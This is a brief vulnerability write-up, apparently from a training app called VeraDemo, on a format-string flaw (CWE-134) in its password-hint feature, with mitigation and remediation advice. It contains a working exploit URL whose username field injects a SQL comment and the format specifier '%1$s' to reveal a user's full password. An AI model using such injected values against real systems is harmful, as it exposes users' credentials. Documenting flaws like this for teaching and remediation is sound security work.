CWE-134: Use of Externally-Controlled Format String in VeraDemo
===============================================================

VeraDemo has a helpful feature that will allow you to get a hint about your obfuscated password.
Unfortunately the obfuscation is injectable so we can inject our own format specifiers in there.

Exploit
-------
1. Go to http://localhost:8080/password-hint?username=admin%27%20--%20the%20full%20password%20is%22%251%24s%22%20and%20the%20partial%20password%20is:
2. See the full password as well as the obfuscated password.

Note that the URL decoded version of the username is: admin' -- the full password is"%1$s" and the partial password is
So first we end the SQL query with "' -- " which will consider everything after the -- to be a quote for the SQL query.
Then we embed the format specifier "%1$s" which tells the Java Formatter to provide the full first argument.

Mitigation
----------
Apply input filtering to username

Remediation
-----------
Do not concatenate the username but use another format parameter.

Resources
---------
* [CWE-134](https://cwe.mitre.org/data/definitions/134.html)
